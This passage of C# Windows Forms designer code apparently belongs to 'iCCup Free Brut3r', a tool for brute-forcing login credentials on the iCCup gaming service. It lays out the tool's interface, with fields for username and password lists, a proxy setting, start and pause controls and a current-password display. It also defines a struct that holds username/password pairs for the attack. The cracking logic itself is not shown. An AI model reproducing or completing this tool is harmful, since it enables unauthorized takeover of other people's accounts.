            this.label12.BackColor = System.Drawing.Color.Transparent;
            this.label12.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.label12.Location = new System.Drawing.Point(154, 378);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(121, 17);
            this.label12.TabIndex = 11;
            this.label12.Text = "Текущий пароль:";
            // 
            // CurrentPassword
            // 
            this.CurrentPassword.AutoSize = true;
            this.CurrentPassword.BackColor = System.Drawing.Color.Transparent;
            this.CurrentPassword.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.CurrentPassword.Location = new System.Drawing.Point(271, 378);
            this.CurrentPassword.Name = "CurrentPassword";
            this.CurrentPassword.Size = new System.Drawing.Size(0, 17);
            this.CurrentPassword.TabIndex = 11;
            // 
            // AbsolBruter
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackgroundImage = global::UnrealIccupBruteforcer.AllResources.MainForm;
            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.ClientSize = new System.Drawing.Size(400, 600);
            this.Controls.Add(this.LabelM1);
            this.Controls.Add(this.RunnedBrute);
            this.Controls.Add(this.LoginIccupGetted);
            this.Controls.Add(this.BaseLoaded);
            this.Controls.Add(this.LogMyBox);
            this.Controls.Add(this.CurrentPassword);
            this.Controls.Add(this.CurrentLogin);
            this.Controls.Add(this.label12);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.label9);
            this.Controls.Add(this.label6);
            this.Controls.Add(this.PcEnd);
            this.Controls.Add(this.UsersCount);
            this.Controls.Add(this.label10);
            this.Controls.Add(this.label8);
            this.Controls.Add(this.label7);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.LabelM2);
            this.Controls.Add(this.LabelM3);
            this.Controls.Add(this.StartButton);
            this.Controls.Add(this.PauseButton);
            this.Controls.Add(this.SwapMode);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.CheckButton);
            this.Controls.Add(this.BrutePassword);
            this.Controls.Add(this.BruteUsername);
            this.Controls.Add(this.TrayButton);
            this.Controls.Add(this.ExitButton);
            this.Controls.Add(this.PokePictBox);
            this.Controls.Add(this.LoadNickPwdSeperated);
            this.Controls.Add(this.MyProxy);
            this.Controls.Add(this.SeparatorLP);
            this.Controls.Add(this.UsernamesForBrute);
            this.Controls.Add(this.PasswordForBrute);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = global::UnrealIccupBruteforcer.AllResources.Icon;
            this.Name = "AbsolBruter";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "iCCup Free Brut3r";
            this.Load += new System.EventHandler(this.AbsolFreeBrut3Force_Load);
            this.Resize += new System.EventHandler(this.AbsolFreeBrut3Force_Resize);
            ((System.ComponentModel.ISupportInitialize)(this.PokePictBox)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.ExitButton)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.TrayButton)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.CheckButton)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.SwapMode)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.BaseLoaded)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.LoginIccupGetted)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.RunnedBrute)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        public class GlobalVars
        {
            public static List<AbsolBruter.GlobalVars.BruteBaseStruct> BruteBase;

            public GlobalVars()
            {

            }

            static GlobalVars()
            {
                AbsolBruter.GlobalVars.BruteBase = new List<AbsolBruter.GlobalVars.BruteBaseStruct>();
            }

            public struct BruteBaseStruct
            {
                public string username;
                public string password;
                public bool Requested;
                public BruteBaseStruct(string username, string password, bool requested = false)
                {
                    this.username = username.Trim();
                    this.password = password.Trim();
                    this.Requested = requested;
                }
            }
        }
    }
}
